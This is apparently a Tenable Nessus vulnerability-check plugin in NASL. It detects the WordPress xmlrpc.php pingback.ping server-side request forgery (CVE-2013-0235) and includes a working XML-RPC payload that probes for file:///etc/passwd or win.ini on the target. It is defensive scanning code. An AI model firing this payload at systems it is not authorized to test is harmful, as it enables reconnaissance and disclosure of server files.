#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(64453);
  script_version("$Revision: 1.6 $");
  script_cvs_date("$Date: 2016/05/06 17:22:03 $");

  script_cve_id("CVE-2013-0235");
  script_bugtraq_id(57554);
  script_osvdb_id(89138);

  script_name(english:"WordPress 'xmlrpc.php' pingback.ping Server-Side Request Forgery");
  script_summary(english:"Attempts to verify the existence of files.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
server-side request forgery vulnerability.");
  script_set_attribute(attribute:"description", value:
"The WordPress install hosted on the remote web server is affected by a
server-side request forgery vulnerability because the 'pingback.ping'
method used in 'xmlrpc.php' fails to properly validate source URIs
(Uniform Resource Identifiers). A remote, unauthenticated attacker can
exploit this issue to disclose sensitive information and conduct
remote port scanning against a remote host.");
  script_set_attribute(attribute:"see_also", value:"https://github.com/FireFart/WordpressPingbackPortScanner");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/525045/30/0/threaded");
  script_set_attribute(attribute:"see_also", value:"http://lab.onsec.ru/2013/01/wordpress-xmlrpc-pingback-additional.html");
  script_set_attribute(attribute:"see_also", value:"http://wordpress.org/news/2013/01/wordpress-3-5-1/");
  script_set_attribute(attribute:"see_also", value:"http://codex.wordpress.org/Version_3.5.1");
  script_set_attribute(attribute:"solution", value:"Upgrade to WordPress 3.5.1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/12/11");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/01/24");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/02/04");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2016 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl", "os_fingerprint.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

# Determine what to look for.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) files = make_list('windows/win.ini', 'winnt/win.ini');
  else files = make_list('etc/passwd');
}
else files = make_list('etc/passwd', 'windows/win.ini', 'winnt/win.ini');

# Verify that xmlrpc.php is accessible
vuln = FALSE;

res = http_send_recv3(
    method    : "GET",
    item      : dir + "/xmlrpc.php",
    port         : port,
    exit_on_fail : TRUE
);

if ("XML-RPC server accepts POST requests only" >< res[2])
{
  foreach file (files)
  {
    postdata = '<?xml version="1.0" encoding="utf-8"?>\r\n' +
    '<methodCall>\r\n' +
    '  <methodName>pingback.ping</methodName>\r\n' +
    '  <params>\r\n' +
    '  <param><value><string>file:///' +file+ '</string></value></param>\r\n'+
    '  <param><value><string>' +install_url+ '/?p=1</string></value></param>'+
    '\r\n' +
    '  </params>\r\n' +
    '</methodCall>\r\n';

    res =  http_send_recv3(
      method    : "POST",
      item      : dir + "/xmlrpc.php",
      data      : postdata,
      content_type : "application/x-www-form-urlencoded",
      port         : port,
      exit_on_fail : TRUE
    );
    exp_request = http_last_sent_request();

    # If file is found, our string will report our title is not found
    # Else our response will reflect 'The source URL does not exist.'
    if ("<string>We cannot find a title on that page" >< res[2])
    {
      vuln = TRUE;
      break;
    }
  }
}

if (!vuln)
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);

if (report_verbosity > 0)
{
  snip =  crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
  report =
    '\nNessus was able to verify the issue exists using the following request :' +
    '\n' +
    '\n' + exp_request +
    '\n';
  if (report_verbosity > 1)
  {
    report +=
      '\n' + 'By examining the response, Nessus was able to verify the file'+
      '\n' + '"' +file+ '" exists on the remote host. This can be observed' +
      '\n' + 'in the following output :' +
      '\n' +
      '\n' + snip +
      '\n' + chomp(res[2]) +
      '\n' + snip +
      '\n';
  }
  security_warning(port:port, extra:report);
}
else security_warning(port);

